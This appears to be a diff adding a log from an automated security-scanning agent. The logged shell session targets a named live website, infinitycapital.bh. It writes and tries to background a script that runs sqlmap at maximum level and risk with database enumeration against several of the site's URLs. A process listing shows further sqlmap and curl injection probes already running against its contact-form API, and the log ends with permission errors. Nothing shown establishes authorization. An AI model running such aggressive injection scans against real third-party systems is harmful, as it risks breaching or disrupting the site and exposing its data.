@@ -1,0 +1,25 @@
+# command: cd "$WORK_PATH"; pgrep -af "api/send" | grep -v defunct | head -2; cat > run_sqlmap.sh <<'EOF'
+#!/bin/bash
+cd "$WORK_PATH"
+B="--batch --level=5 --risk=3 --dbs --threads=1 --delay=0.5 --timeout=20 --retries=1 --text-only --output-dir=tool_outputs/sq2"
+sqlmap -u 'https://www.infinitycapital.bh/contact?cb=1&q=test&x=1' -p cb,q,x $B > tool_outputs/sqm_contact.log 2>&1
+sqlmap -u 'https://www.infinitycapital.bh/?id=1&page=2&search=test&zzz=1' -p id,page,search,zzz $B > tool_outputs/sqm_root.log 2>&1
+sqlmap -u 'https://www.infinitycapital.bh/_next/image?url=1&w=2&q=3' -p url,w,q $B > tool_outputs/sqm_img.log 2>&1
+sqlmap -u 'https://www.infinitycapital.bh/api/?id=1&page=2' -p id,page $B > tool_outputs/sqm_api.log 2>&1
+sqlmap -u 'https://www.infinitycapital.bh/404?q=test&x=1' -p q,x $B > tool_outputs/sqm_404.log 2>&1
+sqlmap -u 'https://www.infinitycapital.bh/feeds/all.atom.xml?id=1&q=test' -p id,q $B > tool_outputs/sqm_feed.log 2>&1
+echo DONE_SQM > tool_outputs/sqm_done
+EOF
+chmod +x run_sqlmap.sh; setsid nohup ./run_sqlmap.sh > /dev/null 2>&1 < /dev/null & echo launched
+# tool: pgrep
+# exit_code: 0
+# ts: 2026-09-30T11:35:22.188322+00:00
+# ---
+
+246829 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/send --data=fname=*&lname=*&areacode=*&tel=*&cname=*&subject=*&msg=*&check=*&targets=* --method=POST --batch --level=3 --risk=3 --dbs --threads=1 --delay=0.6 --timeout=20 --retries=1 --flush-session --headers=User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0|Accept: */*|Content-Type: application/x-www-form-urlencoded|Referer: https://www.infinitycapital.bh/contact --output-dir=tool_outputs/sqlmap_send
+247653 bash -lc export WORK_PATH=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e; cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e 2>/dev/null; cd /work/evidence/indep_verify; run() { printf '\n===== %s =====\n  REQ targets: [%s]\n' "$1" "$2"; curl -sk -X POST 'https://www.infinitycapital.bh/api/send' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36' -H 'Accept: application/json' -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=0' -F 'cname=C' -F 'subject=IndepVerifier 9f2a' -F 'msg=Independent security verification.' -F 'check=on' -F "targets=$2" -o b.tmp -w 'HTTP=%{http_code} '; echo "BODY: $(cat b.tmp)"; } run "T_empty  targets=''" '' run "T_noval  targets='not-an-email'" 'not-an-email'
+launched
+
+[exit=0]
+bash: line 1: run_sqlmap.sh: Permission denied
+chmod: changing permissions of 'run_sqlmap.sh': Operation not permitted
